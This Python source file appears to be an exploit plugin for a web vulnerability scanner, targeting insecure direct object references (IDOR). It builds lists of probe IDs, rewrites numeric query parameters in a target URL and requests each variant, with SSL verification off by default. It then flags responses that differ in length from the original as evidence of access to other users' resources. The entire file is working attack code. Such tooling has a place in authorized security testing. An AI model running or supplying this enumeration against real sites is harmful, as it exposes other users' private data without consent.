"""
IDOR (Insecure Direct Object Reference) Exploit Plugin

Provides exploit capabilities for IDOR vulnerabilities:
- Enumerate object references
- Access other users' resources
- Generate proof-of-concept showing data leakage
"""

import sys
import os
import re
from typing import Dict, List, Any, Optional
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import logging

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

from scanner.plugins.exploit_plugin import ExploitPlugin

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

logger = logging.getLogger(__name__)

_NUMERIC_RE = re.compile(r'^\d+$')


class IDORPlugin(ExploitPlugin):
    """IDOR exploit plugin for enumerating and accessing object references."""

    @property
    def vulnerability_type(self) -> str:
        return 'idor'

    @property
    def name(self) -> str:
        return 'IDOR Exploit'

    @property
    def description(self) -> str:
        return 'Insecure Direct Object Reference exploit plugin for enumerating resources.'

    @property
    def version(self) -> str:
        return '1.0.0'

    def generate_payloads(self, context: Optional[Dict[str, Any]] = None) -> List[str]:
        """Generate IDOR test payloads (sequential IDs, UUIDs, and common values)."""
        context = context or {}
        base_id = int(context.get('base_id', 1))
        # Sequential IDs around base_id
        payloads = [str(i) for i in range(max(1, base_id - 5), base_id + 16)]
        # Add common probe IDs
        extra = [
            '0', '999', '9999', '99999',
            '100', '101', '1000', '1001',
            '-1', '2147483647',
            # UUID-style probes
            '00000000-0000-0000-0000-000000000001',
            '00000000-0000-0000-0000-000000000002',
            # Common admin IDs
            'admin', 'me', 'self', 'current',
            # Hash-like probes
            'null', 'undefined', 'true', 'false',
        ]
        for e in extra:
            if e not in payloads:
                payloads.append(e)
        return payloads

    def execute_attack(self, target_url: str, vulnerability_data: Dict[str, Any],
                       config: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
        """Attempt IDOR by enumerating IDs in URL parameters and path."""
        if not HAS_REQUESTS:
            return {
                'success': False,
                'error': 'Requests library not available',
                'vulnerability_type': 'idor',
            }

        config = config or {}
        verify_ssl = config.get('verify_ssl', False)
        timeout = config.get('timeout', 10)

        parsed = urlparse(target_url)
        qs = parse_qs(parsed.query, keep_blank_values=True)

        # Find numeric parameter values to fuzz
        numeric_params = {k: v[0] for k, v in qs.items() if v and _NUMERIC_RE.match(v[0])}

        results = []

        for param, original_id in numeric_params.items():
            base = int(original_id)
            probe_ids = [str(base + i) for i in range(1, 6)]
            try:
                orig_resp = requests.get(target_url, timeout=timeout, verify=verify_ssl)
                orig_len = len(orig_resp.content)
            except Exception:
                continue

            for probe_id in probe_ids:
                try:
                    new_qs = dict(qs)
                    new_qs[param] = [probe_id]
                    new_url = urlunparse(parsed._replace(
                        query=urlencode({k: v[0] for k, v in new_qs.items()})
                    ))
                    resp = requests.get(new_url, timeout=timeout, verify=verify_ssl)
                    # Different non-empty 200 response suggests different resource returned
                    if (resp.status_code == 200 and len(resp.content) > 50
                            and abs(len(resp.content) - orig_len) > 10):
                        results.append({
                            'parameter': param,
                            'original_id': original_id,
                            'probed_id': probe_id,
                            'url': new_url,
                            'response_length': len(resp.content),
                        })
                except Exception as e:
                    logger.debug(f"IDOR probe error: {e}")

        if results:
            return {
                'success': True,
                'vulnerability_type': 'idor',
                'evidence': f'Accessed {len(results)} additional resource(s) by manipulating IDs',
                'findings': results,
                'message': 'IDOR vulnerability confirmed â€” resources accessible by ID manipulation',
            }

        return {
            'success': False,
            'error': 'No IDOR vulnerability confirmed',
            'vulnerability_type': 'idor',
        }
